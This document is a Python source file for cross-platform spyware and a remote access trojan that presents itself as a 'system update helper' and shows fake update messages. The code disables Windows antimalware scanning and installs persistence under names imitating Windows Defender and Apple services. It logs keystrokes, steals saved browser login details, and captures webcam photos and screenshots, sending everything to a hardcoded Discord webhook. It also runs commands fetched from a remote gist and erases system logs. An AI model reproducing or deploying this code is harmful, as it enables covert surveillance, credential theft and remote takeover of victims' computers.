import os, sys, time, subprocess, logging, socket, platform, getpass, shutil, sqlite3, json, requests, threading, random, string, re, glob, psutil, atexit, traceback
from datetime import datetime
try:
    import ctypes
    from ctypes import wintypes
except ImportError:
    ctypes = None
    logging.warning("ctypes unavailable; some features may fail")

try:
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, OpenKey, SetValueEx, QueryValueEx
except ImportError:
    winreg = None
    logging.basicConfig(level=logging.DEBUG, filename="system_update_helper.log", filemode="a", format="%(asctime)s - %(levelname)s - %(message)s")
    logging.warning("winreg unavailable; some Windows features will fail")

try:
    from PIL import ImageGrab
    import cv2
    from pynput.keyboard import Listener
except ImportError as e:
    logging.error("Critical import failed: %s", e)
    sys.exit(1)

VERSION = "2.3.1"  # Updated version
TEMP_LOG = os.path.join(os.getenv("TEMP", "/tmp"), "system_update_helper.log")
logging.basicConfig(level=logging.DEBUG, filename=TEMP_LOG, filemode="a", format="%(asctime)s - %(levelname)s - %(message)s", force=True)  # Force flush
PYTHON_VERSION = sys.version_info
IS_FSTRING = PYTHON_VERSION >= (3, 6)
DEBUG = True
IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if platform.system() == "Windows" and ctypes else True
OS_TYPE, IS_WINDOWS, IS_MAC, IS_LINUX = platform.system(), platform.system() == "Windows", platform.system() == "Darwin", platform.system() == "Linux"

def log_debug(msg, *args, exc_info=None):
    msg = msg if not args else msg % args
    if exc_info:
        logging.debug(f"{msg} - Stacktrace: {''.join(traceback.format_exception(*exc_info))}" if IS_FSTRING else "%s - Stacktrace: %s" % (msg, ''.join(traceback.format_exception(*exc_info))))
    else:
        logging.debug(msg)
    logging.getLogger().handlers[0].flush()  # Immediate write

log_debug("Script started - v%s", VERSION)

def install_deps():
    log_debug("Ensuring dependencies")
    py_ver_str = f"cp{PYTHON_VERSION.major}{PYTHON_VERSION.minor}" if IS_FSTRING else "cp%d%d" % (PYTHON_VERSION.major, PYTHON_VERSION.minor)
    base_pkgs = [
        ("pywin32", "pywin32>=306", f"https://files.pythonhosted.org/packages/63/3d/359e9bf8b96f84624c8d61d9e7fe9f4c4cd6b996fd04f5c4fa0c839e77e6/pywin32-306-{py_ver_str}-win_amd64.whl" if IS_WINDOWS else None),
        ("requests", "requests>=2.28.1", "https://files.pythonhosted.org/packages/63/70/2bf7780ad2d390a8d301ad0b550f1581eadbd9a20f896afe06353c2a2913/requests-2.32.3-py3-none-any.whl"),
        ("psutil", "psutil>=5.9.0", f"https://files.pythonhosted.org/packages/3d/7d/d0580c630831d6aaed1882cf8e4b7d973da2a7d4dc0b041b3c3dcdf2e8f2/psutil-5.9.8-{py_ver_str}-win_amd64.whl" if IS_WINDOWS else "https://files.pythonhosted.org/packages/3d/7d/d0580c630831d6aaed1882cf8e4b7d973da2a7d4dc0b041b3c3dcdf2e8f2/psutil-5.9.8.tar.gz"),
        ("pynput", "pynput>=1.7.6", "https://files.pythonhosted.org/packages/66/8b/f93da8ca11f2c1ce0e5a8c03a79d725b8c71d5c8d7c5db6e2c25a6f2c4c6/pynput-1.7.7-py3-none-any.whl"),
        ("pillow", "Pillow>=9.0.0", f"https://files.pythonhosted.org/packages/d3/c3/b593f064ac29d62cf7aa8e6e6c5754fb81b3d65e9df0c6e2fa5aa230f356/Pillow-10.3.0-{py_ver_str}-win_amd64.whl" if IS_WINDOWS else "https://files.pythonhosted.org/packages/d3/c3/b593f064ac29d62cf7aa8e6e6c5754fb81b3d65e9df0c6e2fa5aa230f356/Pillow-10.3.0.tar.gz"),
        ("opencv-python", "opencv-python>=4.5.5", f"https://files.pythonhosted.org/packages/38/d2/3e8c13ffc500e243986e7eb7420d507bf18998f87ca559b923a0e51ca8c44/opencv_python-4.9.0.80-{py_ver_str}-win_amd64.whl" if IS_WINDOWS else "https://files.pythonhosted.org/packages/38/d2/3e8c13ffc500e243986e7eb7420d507bf18998f87ca559b923a0e51ca8c44/opencv_python-4.9.0.80.tar.gz"),
        ("pycryptodome", "pycryptodome>=3.15.0", f"https://files.pythonhosted.org/packages/1c/77/9f7368e8b9b9eafb785de5250b8a5e1dc576d22fe4c5f8166db25eb4c996/pycryptodome-3.20.0-{py_ver_str}-win_amd64.whl" if IS_WINDOWS else "https://files.pythonhosted.org/packages/1c/77/9f7368e8b9b9eafb785de5250b8a5e1dc576d22fe4c5f8166db25eb4c996/pycryptodome-3.20.0.tar.gz")
    ]
    for dep, pkg, url in base_pkgs:
        try:
            __import__(dep)
            log_debug("%s installed", dep)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])
                log_debug("Installed %s via pip", pkg)
                if dep == "pywin32" and IS_WINDOWS and ctypes:
                    site_packages = next(p for p in sys.path if "site-packages" in p.lower())
                    post_install_script = os.path.join(site_packages, "pywin32_postinstall.py")
                    if os.path.exists(post_install_script):
                        subprocess.check_call([sys.executable, post_install_script, "-install"])
                        log_debug("Ran pywin32 post-install script")
            except Exception as e:
                log_debug("pip failed for %s: %s", pkg, e, exc_info=sys.exc_info())
                if url:
                    for _ in range(3):
                        try:
                            temp_file = os.path.join(os.getenv("TEMP", "/tmp"), "%s_%s.whl" % (dep, random_string()))
                            open(temp_file, "wb").write(requests.get(url, timeout=10).content)
                            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", temp_file])
                            os.remove(temp_file)
                            log_debug("Installed %s from fallback", dep)
                            if dep == "pywin32" and IS_WINDOWS and ctypes:
                                site_packages = next(p for p in sys.path if "site-packages" in p.lower())
                                post_install_script = os.path.join(site_packages, "pywin32_postinstall.py")
                                if os.path.exists(post_install_script):
                                    subprocess.check_call([sys.executable, post_install_script, "-install"])
                                    log_debug("Ran pywin32 post-install script from fallback")
                            break
                        except Exception as e:
                            log_debug("Fallback failed: %s", e, exc_info=sys.exc_info())
                            time.sleep(2)
                            continue
                else:
                    logging.critical("Failed to install %s", dep)
                    return False
    for mod in [cv2, ImageGrab, Listener]:
        if not mod:
            logging.critical("Critical module missing")
            return False
    if IS_WINDOWS and ctypes:
        try:
            import win32api
            log_debug("pywin32 verified")
        except ImportError:
            logging.critical("pywin32 not installed correctly")
            return False
    return True

if not install_deps():
    logging.critical("Dependency install failed")
    sys.exit(1)
print(f"[{datetime.now()}] *** Running sneaky.py v{VERSION} *** - Dependencies OK" if IS_FSTRING else "[%s] *** Running sneaky.py v%s *** - Dependencies OK" % (datetime.now(), VERSION))

try:
    from Quartz import CGEventTapCreate, kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventKeyDown, CGEventGetIntegerValueField
    log_debug("Quartz loaded")
except ImportError:
    Quartz = None
    log_debug("Quartz unavailable")
try:
    from Xlib import display, X
    log_debug("Xlib loaded")
except ImportError:
    Xlib = None
    log_debug("Xlib unavailable")
try:
    import evdev
    log_debug("evdev loaded")
except ImportError:
    evdev = None
    log_debug("evdev unavailable")

WEBHOOK_URL = "https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~\\Application Data")), "SystemUtilities")
HIDE_FILE = os.path.join(HIDE_DIR, "system_update_helper.py")
PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")
buffer_lock, keylogger_stop = threading.Lock(), threading.Event()

def send_to_discord(data=None, file_path=None):
    log_debug("Sending: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')
    if not data and not file_path:
        data = "Error: No data or file"
        logging.error("No data/file")
    if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= 4*1024*1024:
        for _ in range(3):
            try:
                time.sleep(random.randint(0, 180))
                requests.post(WEBHOOK_URL, files={"file": open(file_path, "rb")}, timeout=5)
                os.remove(file_path)
                log_debug("Sent %s", file_path)
                break
            except Exception as e:
                log_debug("File send failed: %s", e, exc_info=sys.exc_info())
                time.sleep(2)
                continue
    else:
        data = str(data).encode('utf-8') if data else "Error: Data None".encode('utf-8')
        for i in range(0, len(data), 4*1024*1024):
            try:
                requests.post(WEBHOOK_URL, json={"content": data[i:i+4*1024*1024].decode('utf-8', 'ignore')}, timeout=5)
                log_debug("Sent chunk %d", i//(4*1024*1024)+1)
            except Exception as e:
                log_debug("Chunk send failed: %s", e, exc_info=sys.exc_info())
                time.sleep(2)
                continue

def manage_instance():
    log_debug("Entering manage_instance")
    try:
        log_debug("Checking if PID file exists: %s", PID_FILE)
        if os.path.exists(PID_FILE):
            log_debug("PID file found, reading content")
            try:
                with open(PID_FILE, 'r') as f:
                    pid_content = f.read().strip()
                log_debug("PID file content: %s", pid_content)
            except Exception as e:
                log_debug("Failed to read PID file: %s", e, exc_info=sys.exc_info())
                raise
            if pid_content:
                try:
                    pid = int(pid_content)
                    log_debug("Parsed PID: %d", pid)
                except ValueError as e:
                    log_debug("Invalid PID in file: %s", e, exc_info=sys.exc_info())
                    if os.path.exists(PID_FILE):
                        os.remove(PID_FILE)
                        log_debug("Removed invalid PID file")
                    pid = None
                if pid:
                    current_pid = os.getpid()
                    log_debug("Current PID: %d", current_pid)
                    if pid == current_pid:
                        log_debug("PID matches current process; proceeding")
                    elif psutil.pid_exists(pid):
                        try:
                            proc = psutil.Process(pid)
                            proc_name = proc.name()
                            exe_name = sys.executable.split('\\')[-1]
                            log_debug("Process %d exists, name: %s, expected: %s", pid, proc_name, exe_name)
                            if proc_name == exe_name:
                                log_debug("Another instance running with PID %d", pid)
                                raise RuntimeError(f"Another instance running with PID {pid}" if IS_FSTRING else "Another instance running with PID %d" % pid)
                            else:
                                log_debug("PID %d is not this script; overwriting", pid)
                        except psutil.NoSuchProcess:
                            log_debug("PID %d no longer exists; overwriting", pid)
                    else:
                        log_debug("PID %d not running; overwriting", pid)
            else:
                log_debug("PID file exists but is empty; overwriting")
        log_debug("Creating hide directory if not exists: %s", HIDE_DIR)
        os.makedirs(HIDE_DIR, exist_ok=True)
        log_debug("Writing current PID to file")
        try:
            with open(PID_FILE, "w") as f:
                current_pid = os.getpid()
                f.write(str(current_pid))
            log_debug("PID %d written to file", current_pid)
        except Exception as e:
            log_debug("Failed to write PID file: %s", e, exc_info=sys.exc_info())
            raise
        log_debug("Registering PID file cleanup")
        atexit.register(lambda: os.remove(PID_FILE) if os.path.exists(PID_FILE) else None)
        log_debug("PID managed for process %d", os.getpid())
    except Exception as e:
        log_debug("manage_instance failed: %s", e, exc_info=sys.exc_info())
        raise

def run_command(cmd, retries=3):
    log_debug("Running: %s", cmd)
    for _ in range(retries):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            logging.info("Executed: %s", cmd)
            return result
        except Exception as e:
            log_debug("Command failed: %s", e, exc_info=sys.exc_info())
            time.sleep(2)
            continue
    return None

def persist():
    log_debug("Setting persistence")
    if IS_WINDOWS and IS_ADMIN and winreg:
        task_exists = run_command('schtasks /query /tn WindowsDefenderHealthService')
        if not task_exists or "ERROR" in task_exists.stderr:
            cmd = f'schtasks /create /tn WindowsDefenderHealthService /tr "\"{sys.executable}\" \"{HIDE_FILE}\"" /sc ONSTART /ru SYSTEM /f' if IS_FSTRING else 'schtasks /create /tn WindowsDefenderHealthService /tr "\"%s\" \"%s\"" /sc ONSTART /ru SYSTEM /f' % (sys.executable, HIDE_FILE)
            run_command(cmd)
        if not task_exists:
            try:
                with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS) as key:
                    try:
                        QueryValueEx(key, "WindowsDefenderHealth")
                    except FileNotFoundError:
                        val = f'"{sys.executable}" "{HIDE_FILE}"' if IS_FSTRING else '"%s" "%s"' % (sys.executable, HIDE_FILE)
                        SetValueEx(key, "WindowsDefenderHealth", 0, 1, val)
                log_debug("Registry set")
            except Exception as e:
                log_debug("Registry failed: %s", e, exc_info=sys.exc_info())
    elif IS_MAC:
        plist = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>{sys.executable}</string><string>{HIDE_FILE}</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>' if IS_FSTRING else '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>%s</string><string>%s</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>' % (sys.executable, HIDE_FILE)
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.systemupdate.plist")
        if not os.path.exists(plist_path):
            open(plist_path, "w").write(plist)
            run_command(f"launchctl load {plist_path}" if IS_FSTRING else "launchctl load %s" % plist_path)
            log_debug("macOS persistence set")
        run_command(f"(crontab -l 2>/dev/null; echo '@reboot {sys.executable} {HIDE_FILE}') | crontab -" if IS_FSTRING else "(crontab -l 2>/dev/null; echo '@reboot %s %s') | crontab -" % (sys.executable, HIDE_FILE))
    elif IS_LINUX:
        service = f'[Unit]\nDescription=System Update\n[Service]\nExecStart={sys.executable} {HIDE_FILE}\nRestart=always\n[Install]\nWantedBy=default.target' if IS_FSTRING else '[Unit]\nDescription=System Update\n[Service]\nExecStart=%s %s\nRestart=always\n[Install]\nWantedBy=default.target' % (sys.executable, HIDE_FILE)
        service_path = os.path.expanduser("~/.config/systemd/user/system-update.service")
        if not os.path.exists(service_path):
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            open(service_path, "w").write(service)
            run_command("systemctl --user enable system-update.service")
            log_debug("Linux persistence set")
        run_command(f"(crontab -l 2>/dev/null; echo '@reboot {sys.executable} {HIDE_FILE}') | crontab -" if IS_FSTRING else "(crontab -l 2>/dev/null; echo '@reboot %s %s') | crontab -" % (sys.executable, HIDE_FILE))
    else:
        logging.warning("No admin privileges or unsupported OS; persistence limited")

def random_string(n=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n)) if PYTHON_VERSION < (3, 6) else ''.join(random.choices(string.ascii_lowercase, k=n))

def fake_updates():
    print(f"[{datetime.now()}] v{VERSION} - Updating System..." if IS_FSTRING else "[%s] v%s - Updating System..." % (datetime.now(), VERSION))
    [time.sleep(0.3) for _ in range(3)]
    print("Update complete!")
    log_debug("Fake updates done")

def bypass_defender():
    if IS_WINDOWS and ctypes and IS_ADMIN:
        try:
            dll = ctypes.windll.kernel32.LoadLibraryA(b"amsi.dll")
            addr = ctypes.windll.kernel32.GetProcAddress(dll, b"AmsiScanBuffer")
            old_protect = ctypes.c_uint32()
            ctypes.windll.kernel32.VirtualProtect(addr, 5, 0x40, ctypes.byref(old_protect))
            ctypes.memset(addr, 0xC3, 5)
            logging.info("Defender bypassed")
        except Exception as e:
            log_debug("Bypass failed: %s", e, exc_info=sys.exc_info())

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD), ("flags", wintypes.DWORD), ("time", wintypes.DWORD), ("dwExtraInfo", wintypes.LPARAM)]

def keylogger():
    global keylog_buffer
    keylog_buffer = []
    log_debug("Keylogger started")
    try:
        if IS_WINDOWS and ctypes and IS_ADMIN:
            WH_KEYBOARD_LL = 13
            CMPFUNC = ctypes.CFUNCTYPE(wintypes.LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            hook = None
            def handler(nCode, wParam, lParam):
                if keylogger_stop.is_set():
                    return -1
                if nCode >= 0 and wParam == 256:
                    with buffer_lock:
                        keylog_buffer.append(f"Key: {ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode}" if IS_FSTRING else "Key: %d" % ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode)
                return ctypes.windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)
            hook = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, CMPFUNC(handler), ctypes.windll.kernel32.GetModuleHandleW(None), 0)
            if not hook:
                raise ctypes.WinError(ctypes.get_last_error())
            msg = wintypes.MSG()
            while not keylogger_stop.is_set() and ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0):
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
                with buffer_lock:
                    if keylog_buffer:
                        send_to_discord("\n".join(keylog_buffer))
                        keylog_buffer = []
            if hook:
                ctypes.windll.user32.UnhookWindowsHookEx(hook)
        elif IS_MAC and Quartz:
            def callback(proxy, type, event, refcon):
                if keylogger_stop.is_set():
                    return None
                if type == kCGEventKeyDown:
                    with buffer_lock:
                        keylog_buffer.append(f"Key: {CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)}" if IS_FSTRING else "Key: %d" % CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode))
                return event
            tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, 1 << kCGEventKeyDown, callback, None)
            run_loop = Quartz.CFRunLoopCurrent()
            Quartz.CFRunLoopAddSource(run_loop, tap, Quartz.kCFRunLoopCommonModes)
            while not keylogger_stop.is_set():
                with buffer_lock:
                    if keylog_buffer:
                        send_to_discord("\n".join(keylog_buffer))
                        keylog_buffer = []
                Quartz.CFRunLoopRunInMode(Quartz.kCFRunLoopDefaultMode, 1, False)
        elif IS_LINUX and evdev:
            keyboard = next((dev for dev in [evdev.InputDevice(path) for path in evdev.list_devices()] if "keyboard" in dev.name.lower()), None)
            if keyboard:
                for event in keyboard.read_loop():
                    if keylogger_stop.is_set():
                        break
                    if event.type == evdev.ecodes.EV_KEY and event.value == 1:
                        with buffer_lock:
                            keylog_buffer.append(f"Key: {event.code}" if IS_FSTRING else "Key: %d" % event.code)
                            send_to_discord("\n".join(keylog_buffer))
                            keylog_buffer = []
        else:
            def on_press(key):
                if keylogger_stop.is_set():
                    return False
                with buffer_lock:
                    keylog_buffer.append(f"Key: {str(key)}" if IS_FSTRING else "Key: %s" % str(key))
            with Listener(on_press=on_press) as listener:
                while not keylogger_stop.is_set():
                    with buffer_lock:
                        if keylog_buffer:
                            send_to_discord("\n".join(keylog_buffer))
                            keylog_buffer = []
                    time.sleep(1)
    except Exception as e:
        log_debug("Keylogger failed: %s", e, exc_info=sys.exc_info())
        send_to_discord(f"Keylogger error: {e}" if IS_FSTRING else "Keylogger error: %s" % e)

def harvest_data():
    log_debug("Harvesting data")
    data = {
        "system": {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}" if IS_FSTRING else "%s %s" % (platform.system(), platform.release()),
            "arch": platform.machine(),
            "users": [u.name for u in psutil.users()]
        },
        "network": {
            "conns": [c._asdict() for c in psutil.net_connections()],
            "ifaces": psutil.net_if_addrs()
        }
    }
    try:
        send_to_discord(json.dumps(data))
        log_debug("Data harvested")
    except Exception as e:
        log_debug("Harvest failed: %s", e, exc_info=sys.exc_info())
        send_to_discord(f"Harvest error: {e}" if IS_FSTRING else "Harvest error: %s" % e)

def clean_traces():
    log_debug("Cleaning traces")
    if IS_WINDOWS and IS_ADMIN:
        [run_command(cmd) for cmd in ['wevtutil cl System', 'wevtutil cl Security', 'wevtutil cl Application']]
        [open(f, "wb").write(os.urandom(os.path.getsize(f))) or os.remove(f) for f in glob.glob(os.path.expanduser("~\\Windows\\Prefetch\\*.*"))]
    elif IS_LINUX:
        [open(log, "wb").write(os.urandom(os.path.getsize(log))) or run_command(f"shred -zu -n 3 {log}" if IS_FSTRING else "shred -zu -n 3 %s" % log) for log in glob.glob("/var/log/*.log")]
        run_command("journalctl --flush --rotate --vacuum-time=1s")
    elif IS_MAC:
        [open(log, "wb").write(os.urandom(os.path.getsize(log))) or run_command(f"rm -rf {log}" if IS_FSTRING else "rm -rf %s" % log) for log in glob.glob("~/Library/Logs/*")]
        run_command("sudo log erase --all")
    log_debug("Traces cleaned")

def initial_harvest():
    log_debug("Initial harvest")
    data = [f"Time: {datetime.now()}\nHost: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\nUser: {getpass.getuser()}" if IS_FSTRING else "Time: %s\nHost: %s\nIP: %s\nUser: %s" % (datetime.now(), socket.gethostname(), socket.gethostbyname(socket.gethostname()), getpass.getuser())]
    browser_paths = {
        "Chrome": {"mac": "~/Library/Application Support/Google/Chrome/Default", "win": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "linux": "~/.config/google-chrome/Default"},
        "Firefox": {"mac": "~/Library/Application Support/Firefox/Profiles", "win": "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", "linux": "~/.mozilla/firefox"}
    }
    for name, paths in browser_paths.items():
        path = os.path.expanduser(paths["mac"] if IS_MAC else paths["win"] if IS_WINDOWS else paths["linux"])
        if not os.path.exists(path):
            continue
        try:
            if name == "Firefox":
                profile = glob.glob(os.path.join(path, "*.default*"))[0]
                logins = os.path.join(profile, "logins.json")
                if os.path.exists(logins):
                    data.append(f"{name} Logins: {''.join(f'URL: {l['hostname']}, User: {l['username']}\n' for l in json.load(open(logins))['logins'])}" if IS_FSTRING else "%s Logins: %s" % (name, ''.join("URL: %s, User: %s\n" % (l['hostname'], l['username']) for l in json.load(open(logins))['logins'])))
            else:
                login_db = os.path.join(path, "Login Data")
                temp_db = os.path.join(os.getenv("TEMP", "/tmp"), f"login_{random_string()}.db" if IS_FSTRING else "login_%s.db" % random_string())
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value FROM logins")
                data.append(f"{name} Logins: {''.join(f'URL: {row[0]}, User: {row[1]}\n' for row in c.fetchall())}" if IS_FSTRING else "%s Logins: %s" % (name, ''.join("URL: %s, User: %s\n" % (row[0], row[1]) for row in c.fetchall())))
                conn.close()
                os.remove(temp_db)
        except Exception as e:
            log_debug("Harvest %s failed: %s", name, e, exc_info=sys.exc_info())
    send_to_discord("\n".join(data))
    log_debug("Harvest complete")

def selfie():
    log_debug("Taking selfie")
    cap = None
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if not ret:
            raise Exception("Failed to capture frame")
        frame = cv2.resize(frame, (400, 300))
        temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"selfie_{random_string()}.jpg" if IS_FSTRING else "selfie_%s.jpg" % random_string())
        cv2.imwrite(temp_file, frame)
        send_to_discord(None, temp_file)
        log_debug("Selfie sent")
    except Exception as e:
        log_debug("Selfie failed: %s", e, exc_info=sys.exc_info())
        send_to_discord(f"Selfie error: {e}" if IS_FSTRING else "Selfie error: %s" % e)
    finally:
        if cap and cap.isOpened():
            cap.release()

def screenshot():
    log_debug("Taking screenshot")
    try:
        img = ImageGrab.grab().resize((400, 300))
        temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"screenshot_{random_string()}.png" if IS_FSTRING else "screenshot_%s.png" % random_string())
        img.save(temp_file)
        send_to_discord(None, temp_file)
        log_debug("Screenshot sent")
    except Exception as e:
        log_debug("Screenshot failed: %s", e, exc_info=sys.exc_info())
        send_to_discord(f"Screenshot error: {e}" if IS_FSTRING else "Screenshot error: %s" % e)

def main():
    log_debug("Main started")
    try:
        print(f"[{datetime.now()}] v{VERSION} - Main started (Admin: {IS_ADMIN})" if IS_FSTRING else "[%s] v%s - Main started (Admin: %s)" % (datetime.now(), VERSION, IS_ADMIN))
        log_debug("Printed main start message")
    except Exception as e:
        log_debug("Failed to print main start: %s", e, exc_info=sys.exc_info())
        raise
    try:
        sys.excepthook = lambda exc_type, exc_value, exc_traceback: log_debug("Uncaught exception: %s", exc_value, exc_info=(exc_type, exc_value, exc_traceback))
        log_debug("Excepthook set")
    except Exception as e:
        log_debug("Failed to set excepthook: %s", e, exc_info=sys.exc_info())
        raise
    if IS_WINDOWS and not DEBUG and ctypes:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            log_debug("Console hidden")
        except Exception as e:
            log_debug("Failed to hide console: %s", e, exc_info=sys.exc_info())
    try:
        log_debug("Calling manage_instance")
        manage_instance()
        log_debug("manage_instance completed")
    except Exception as e:
        log_debug("manage_instance call failed: %s", e, exc_info=sys.exc_info())
        raise
    try:
        log_debug("Calling bypass_defender")
        bypass_defender()
        log_debug("bypass_defender completed")
    except Exception as e:
        log_debug("bypass_defender call failed: %s", e, exc_info=sys.exc_info())
        raise
    try:
        log_debug("Calling persist")
        persist()
        log_debug("persist completed")
    except Exception as e:
        log_debug("persist call failed: %s", e, exc_info=sys.exc_info())
        raise
    try:
        log_debug("Calling fake_updates")
        fake_updates()
        log_debug("fake_updates completed")
    except Exception as e:
        log_debug("fake_updates call failed: %s", e, exc_info=sys.exc_info())
        raise
    try:
        log_debug("Starting threads")
        threads = [threading.Thread(target=func, daemon=True) for func in [initial_harvest, keylogger, selfie, screenshot]]
        for t in threads:
            try:
                t.start()
                log_debug("Started thread: %s", t.name)
            except Exception as e:
                log_debug("Thread start failed: %s", e, exc_info=sys.exc_info())
        log_debug("All threads started")
    except Exception as e:
        log_debug("Thread setup failed: %s", e, exc_info=sys.exc_info())
        raise
    try:
        handler = CommandHandler()
        log_debug("CommandHandler initialized")
        retry_delay = 1
        log_debug("Entering main loop")
        while True:
            try:
                handler.fetch_commands()
                clean_traces()
                time.sleep(random.randint(300, 900))
                retry_delay = 1
            except Exception as e:
                log_debug("Main loop error: %s", e, exc_info=sys.exc_info())
                send_to_discord(f"Loop error: {e}" if IS_FSTRING else "Loop error: %s" % e)
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, 60)
    except Exception as e:
        log_debug("Main loop setup failed: %s", e, exc_info=sys.exc_info())
        raise

class CommandHandler:
    def __init__(self):
        self.executed = []
        self.fallback_urls = ["https://gist.github.com/jonhardwick-spec/6b171df6eacfad03119b1e1a98f85192/raw"]
        log_debug("CommandHandler init")
    def fetch_commands(self):
        log_debug("Fetching commands")
        for url in self.fallback_urls:
            try:
                resp = requests.get(url, timeout=5)
                self.parse_commands(resp.text)
                break
            except Exception as e:
                log_debug("Fetch failed: %s", e, exc_info=sys.exc_info())
                time.sleep(2)
    def parse_commands(self, data):
        try:
            cmds = json.loads(data)
            [self.execute(cmd["action"], cmd.get("path") or cmd.get("command")) for cmd in cmds if cmd.get("action") not in self.executed and self.executed.append(cmd["action"])]
        except Exception as e:
            log_debug("Parse failed: %s", e, exc_info=sys.exc_info())
    def execute(self, action, param):
        log_debug("Executing %s: %s", action, param)
        if action == "exfiltrate" and os.path.exists(param):
            send_to_discord(None, param)
        elif action == "execute":
            result = run_command(param)
            send_to_discord(result.stdout if result else "Command failed")

if __name__ == "__main__":
    log_debug("Entering __main__")
    try:
        main()
    except Exception as e:
        log_debug("Main error: %s", e, exc_info=sys.exc_info())
        send_to_discord(f"Error: {e}" if IS_FSTRING else "Error: %s" % e)
        keylogger_stop.set()
        os._exit(1)
    finally:
        log_debug("Exiting __main__")